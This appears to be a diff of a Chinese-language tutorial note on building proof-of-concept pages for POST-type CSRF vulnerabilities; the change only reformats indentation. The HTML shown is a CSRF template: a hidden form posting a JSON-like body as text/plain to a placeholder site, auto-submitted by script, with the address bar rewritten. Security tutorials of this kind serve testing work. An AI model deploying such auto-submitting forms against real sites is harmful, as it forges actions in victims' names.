@@ -10,14 +10,16 @@ GET型的CSRF一般比较简单，这里介绍POST型的CSRF漏洞的POC构造�
 ```php
 <html>
 <body>
-	<script>history.pushState('','','/')</script>
+	<script>
+		history.pushState('','','/')
+	</script>
 	
 	<form name="zzz" action="https://aaa.com" method="POST" enctype="text/plain">
 		<input type="hidden" name='json入参' value='json入参产生“=”，此处设法闭合'/>
 	</form>
 	
 	<script type="text/javascript">
-	document.zzz.submit();
+		document.zzz.submit();
 	</script>
 </body>
 </html>
